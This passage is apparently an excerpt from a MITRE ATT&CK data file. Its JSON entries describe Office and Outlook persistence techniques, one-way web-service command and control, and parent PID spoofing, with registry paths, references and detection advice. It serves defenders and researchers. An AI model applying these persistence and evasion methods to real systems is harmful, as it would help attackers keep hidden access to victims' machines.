Rules\",\"url\":\"https://blogs.technet.microsoft.com/office365security/defending-against-rules-and-forms-injection/\"},{\"description\":\"Parisi, T., et al. (2017, July). Using Outlook Forms for Lateral Movement and Persistence. Retrieved February 5, 2019.\",\"source_name\":\"CrowdStrike Outlook Forms\",\"url\":\"https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746\"},{\"description\":\"Soutcast. (2018, September 14). Outlook Today Homepage Persistence. Retrieved February 5, 2019.\",\"source_name\":\"Outlook Today Home Page\",\"url\":\"https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943\"},{\"description\":\"Fox, C., Vangel, D. (2018, April 22). Detect and Remediate Outlook Rules and Custom Forms Injections Attacks in Office 365. Retrieved February 4, 2019.\",\"source_name\":\"Microsoft Detect Outlook Forms\",\"url\":\"https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack\"},{\"description\":\"SensePost. (2017, September 21). NotRuler - The opposite of Ruler, provides blue teams with the ability to detect Ruler usage against Exchange. Retrieved February 4, 2019.\",\"source_name\":\"SensePost NotRuler\",\"url\":\"https://github.com/sensepost/notruler\"}],\"id\":\"attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-06-25T17:48:09.417Z\",\"name\":\"Office Application Startup\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Nick Carr, FireEye\",\"Microsoft Threat Intelligence Center (MSTIC)\",\"Sahar Shukrun\",\"Praetorian\",\"Loic Jaquemet\",\"Ricardo Dias\"],\"x_mitre_data_sources\":[\"Mail server\",\"Process monitoring\",\"Process command-line parameters\",\"Windows Registry\",\"File monitoring\"],\"x_mitre_detection\":\"Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.\\n\\nMany Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page)\\n\\nMicrosoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2019-11-07T20:29:17.788Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\\n\\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \\n\\nWord Normal.dotm location:<br>\\n<code>C:\\\\Users\\\\&lt;username&gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\Templates\\\\Normal.dotm</code>\\n\\nExcel Personal.xlsb location:<br>\\n<code>C:\\\\Users\\\\&lt;username&gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\Excel\\\\XLSTART\\\\PERSONAL.XLSB</code>\\n\\nAdversaries may also change the location of the base template to point to their own by hijacking the application\'s search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\Office16\\\\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) \\n\\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.\",\"external_references\":[{\"external_id\":\"T1137.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1137/001\"},{\"description\":\"Microsoft. (n.d.). Change the Normal template (Normal.dotm). Retrieved July 3, 2017.\",\"source_name\":\"Microsoft Change Normal Template\",\"url\":\"https://support.office.com/article/Change-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea\"},{\"description\":\"Austin, J. (2017, June 6). Getting Started with VBA in Office. Retrieved July 3, 2017.\",\"source_name\":\"MSDN VBA in Office\",\"url\":\"https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office\"},{\"description\":\"Nelson, M. (2014, January 23). Maintaining Access with normal.dotm. Retrieved July 3, 2017.\",\"source_name\":\"enigma0x3 normal.dotm\",\"url\":\"https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/\"},{\"description\":\"Hexacorn. (2017, April 17). Beyond good ol’ Run key, Part 62. Retrieved July 3, 2017.\",\"source_name\":\"Hexacorn Office Template Macros\",\"url\":\"http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/\"},{\"description\":\"Shukrun, S. (2019, June 2). Office Templates and GlobalDotName - A Stealthy Office Persistence Technique. Retrieved August 26, 2019.\",\"source_name\":\"GlobalDotName Jun 2019\",\"url\":\"https://www.221bluestreet.com/post/office-templates-and-globaldotname-a-stealthy-office-persistence-technique\"},{\"description\":\"Parisi, T., et al. (2017, July). Using Outlook Forms for Lateral Movement and Persistence. Retrieved February 5, 2019.\",\"source_name\":\"CrowdStrike Outlook Forms\",\"url\":\"https://malware.news/t/using-outlook-forms-for-lateral-movement-and-persistence/13746\"},{\"description\":\"Soutcast. (2018, September 14). Outlook Today Homepage Persistence. Retrieved February 5, 2019.\",\"source_name\":\"Outlook Today Home Page\",\"url\":\"https://medium.com/@bwtech789/outlook-today-homepage-persistence-33ea9b505943\"}],\"id\":\"attack-pattern--79a47ad0-fc3b-4821-9f01-a026b1ddba21\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-06-25T17:48:08.916Z\",\"name\":\"Office Template Macros\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"Process monitoring\",\"Process command-line parameters\",\"File monitoring\"],\"x_mitre_detection\":\"Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Today Home Page) Modification to base templates, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.(Citation: GlobalDotName Jun 2019)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-11-07T19:44:04.475Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse the Microsoft Office \\\"Office Test\\\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)\\n\\nThere exist user and global Registry keys for the Office Test feature:\\n\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Office test\\\\Special\\\\Perf</code>\\n\\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.\",\"external_references\":[{\"external_id\":\"T1137.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1137/002\"},{\"description\":\"Hexacorn. (2014, April 16). Beyond good ol’ Run key, Part 10. Retrieved July 3, 2017.\",\"source_name\":\"Hexacorn Office Test\",\"url\":\"http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/\"},{\"description\":\"Falcone, R. (2016, July 20). Technical Walkthrough: Office Test Persistence Method Used In Recent Sofacy Attacks. Retrieved July 3, 2017.\",\"source_name\":\"Palo Alto Office Test Sofacy\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/\"}],\"id\":\"attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-20T15:27:51.559Z\",\"name\":\"Office Test\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"DLL monitoring\",\"Loaded DLLs\",\"Process monitoring\",\"Process command-line parameters\",\"File monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"Monitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.(Citation: Palo Alto Office Test Sofacy)\\n\\nConsider monitoring Office processes for anomalous DLL loads.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_system_requirements\":[\"Office 2007, 2010, 2013, and 2016\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-14T22:45:52.963Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.\\n\\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\",\"external_references\":[{\"external_id\":\"T1102.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1102/003\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--9c99724c-a483-4d60-ad9d-7f004e42e8e8\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-26T23:26:10.109Z\",\"name\":\"One-Way Communication\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Host network interface\",\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"Packet capture\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-11-07T20:06:02.624Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)\\n\\nOnce malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)\",\"external_references\":[{\"external_id\":\"T1137.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1137/003\"},{\"description\":\"Stalmans, E. (2017, April 28). Outlook Forms and Shells. Retrieved February 4, 2019.\",\"source_name\":\"SensePost Outlook Forms\",\"url\":\"https://sensepost.com/blog/2017/outlook-forms-and-shells/\"},{\"description\":\"Fox, C., Vangel, D. (2018, April 22). Detect and Remediate Outlook Rules and Custom Forms Injections Attacks in Office 365. Retrieved February 4, 2019.\",\"source_name\":\"Microsoft Detect Outlook Forms\",\"url\":\"https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack\"},{\"description\":\"SensePost. (2017, September 21). NotRuler - The opposite of Ruler, provides blue teams with the ability to detect Ruler usage against Exchange. Retrieved February 4, 2019.\",\"source_name\":\"SensePost NotRuler\",\"url\":\"https://github.com/sensepost/notruler\"}],\"id\":\"attack-pattern--a9e2cea0-c805-4bf8-9e31-f5f0513a3634\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-26T17:35:15.823Z\",\"name\":\"Outlook Forms\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Mail server\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\\n\\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-11-07T20:09:56.536Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Microsoft Outlook\'s Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\\n\\nOnce malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)\\n\",\"external_references\":[{\"external_id\":\"T1137.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1137/004\"},{\"description\":\"Stalmans, E. (2017, October 11). Outlook Home Page – Another Ruler Vector. Retrieved February 4, 2019.\",\"source_name\":\"SensePost Outlook Home Page\",\"url\":\"https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/\"},{\"description\":\"Fox, C., Vangel, D. (2018, April 22). Detect and Remediate Outlook Rules and Custom Forms Injections Attacks in Office 365. Retrieved February 4, 2019.\",\"source_name\":\"Microsoft Detect Outlook Forms\",\"url\":\"https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack\"},{\"description\":\"SensePost. (2017, September 21). NotRuler - The opposite of Ruler, provides blue teams with the ability to detect Ruler usage against Exchange. Retrieved February 4, 2019.\",\"source_name\":\"SensePost NotRuler\",\"url\":\"https://github.com/sensepost/notruler\"}],\"id\":\"attack-pattern--bf147104-abf9-4221-95d1-e81585859441\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-26T17:35:51.656Z\",\"name\":\"Outlook Home Page\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Mail server\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\\n\\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-11-07T20:00:25.560Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)\\n\\nOnce malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)\",\"external_references\":[{\"external_id\":\"T1137.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1137/005\"},{\"description\":\"Landers, N. (2015, December 4). Malicious Outlook Rules. Retrieved February 4, 2019.\",\"source_name\":\"SilentBreak Outlook Rules\",\"url\":\"https://silentbreaksecurity.com/malicious-outlook-rules/\"},{\"description\":\"Fox, C., Vangel, D. (2018, April 22). Detect and Remediate Outlook Rules and Custom Forms Injections Attacks in Office 365. Retrieved February 4, 2019.\",\"source_name\":\"Microsoft Detect Outlook Forms\",\"url\":\"https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack\"},{\"description\":\"SensePost. (2017, September 21). NotRuler - The opposite of Ruler, provides blue teams with the ability to detect Ruler usage against Exchange. Retrieved February 4, 2019.\",\"source_name\":\"SensePost NotRuler\",\"url\":\"https://github.com/sensepost/notruler\"}],\"id\":\"attack-pattern--3d1b9d7e-3921-4d25-845a-7d9f15c0da44\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-26T17:36:15.923Z\",\"name\":\"Outlook Rules\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Mail server\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Microsoft has released a PowerShell script to safely gather mail forwarding rules and custom forms in your mail environment as well as steps to interpret the output.(Citation: Microsoft Detect Outlook Forms) SensePost, whose tool [Ruler](https://attack.mitre.org/software/S0358) can be used to carry out malicious rules, forms, and Home Page attacks, has released a tool to detect Ruler usage.(Citation: SensePost NotRuler)\\n\\nCollect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. Non-standard process execution trees may also indicate suspicious or malicious behavior.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-06-03T14:50:50.613Z\",\"external_references\":[{\"external_id\":\"T1502\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1502\"},{\"description\":\"Stevens, D. (2009, November 22). Quickpost: SelectMyParent or Playing With the Windows Process Tree. Retrieved June 3, 2019.\",\"source_name\":\"DidierStevens SelectMyParent Nov 2009\",\"url\":\"https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/\"},{\"description\":\"Montemayor, D. et al.. (2018, November 15). How User Account Control works. Retrieved June 3, 2019.\",\"source_name\":\"Microsoft UAC Nov 2018\",\"url\":\"https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works\"},{\"description\":\"Loh, I. (2018, December 21). Detecting Parent PID Spoofing. Retrieved June 3, 2019.\",\"source_name\":\"CounterCept PPID Spoofing Dec 2018\",\"url\":\"https://www.countercept.com/blog/detecting-parent-pid-spoofing/\"},{\"description\":\"Tafani-Dereeper, C. (2019, March 12). Building an Office macro to spoof parent processes and command line arguments. Retrieved June 3, 2019.\",\"source_name\":\"CTD PPID Spoofing Macro Mar 2019\",\"url\":\"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/\"},{\"description\":\"Chester, A. (2017, November 20). Alternative methods of becoming SYSTEM. Retrieved June 4, 2019.\",\"source_name\":\"XPNSec PPID Nov 2017\",\"url\":\"https://blog.xpnsec.com/becoming-system/\"},{\"description\":\"Schofield, M. & Satran, M. (2018, May 30). Process Creation Flags. Retrieved June 4, 2019.\",\"source_name\":\"Microsoft Process Creation Flags May 2018\",\"url\":\"https://docs.microsoft.com/windows/desktop/ProcThread/process-creation-flags\"},{\"description\":\"Secuirtyinbits . (2019, May 14). Parent PID Spoofing (Stage 2) Ataware Ransomware Part 3. Retrieved June 6, 2019.\",\"source_name\":\"Secuirtyinbits Ataware3 May 2019\",\"url\":\"https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3\"}],\"id\":\"attack-pattern--9ddc2534-e91c-4dab-a8f6-43dab81e8142\",\"modified\":\"2020-02-18T18:23:31.546Z\",\"name\":\"Parent PID Spoofing\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-18T18:22:41.448Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\\n\\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\\n\\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)\",\"external_references\":[{\"external_id\":\"T1134.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1134/004\"},{\"description\":\"Stevens, D. (2009, November 22). Quickpost: SelectMyParent or Playing With the Windows Process Tree. Retrieved June 3, 2019.\",\"source_name\":\"DidierStevens SelectMyParent Nov 2009\",\"url\":\"https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/\"},{\"description\":\"Montemayor, D. et al.. (2018, November 15). How User Account Control works. Retrieved June 3, 2019.\",\"source_name\":\"Microsoft UAC Nov 2018\",\"url\":\"https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works\"},{\"description\":\"Loh, I. (2018, December 21). Detecting Parent PID Spoofing. Retrieved June 3, 2019.\",\"source_name\":\"CounterCept PPID Spoofing Dec 2018\",\"url\":\"https://www.countercept.com/blog/detecting-parent-pid-spoofing/\"},{\"description\":\"Tafani-Dereeper, C. (2019, March 12). Building an Office macro to spoof parent processes and command line arguments. Retrieved June 3, 2019.\",\"source_name\":\"CTD PPID Spoofing Macro Mar 2019\",\"url\":\"https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/\"},{\"description\":\"Chester, A. (2017, November 20). Alternative methods of becoming SYSTEM. Retrieved June 4, 2019.\",\"source_name\":\"XPNSec PPID Nov 2017\",\"url\":\"https://blog.xpnsec.com/becoming-system/\"},{\"description\":\"Schofield, M. & Satran, M. (2018, May 30). Process Creation Flags. Retrieved June 4, 2019.\",\"source_name\":\"Microsoft Process Creation Flags May 2018\",\"url\":\"https://docs.microsoft.com/windows/desktop/ProcThread/process-creation-flags\"},{\"description\":\"Secuirtyinbits . (2019, May 14). Parent PID Spoofing (Stage 2) Ataware Ransomware Part 3. Retrieved June 6, 2019.\",\"source_name\":\"Secuirtyinbits Ataware3 May 2019\",\"url\":\"https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3\"}],\"id\":\"attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-04-16T19:37:02.030Z\",\"name\":\"Parent PID Spoofing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Wayne Silva, F-Secure Countercept\"],\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"Windows event logs\"],\"x_mitre_defense_bypassed\":[\"Heuristic Detection\",\"Host forensic analysis\"],\"x_mitre_detection\":\"Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)\\n\\nMonitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
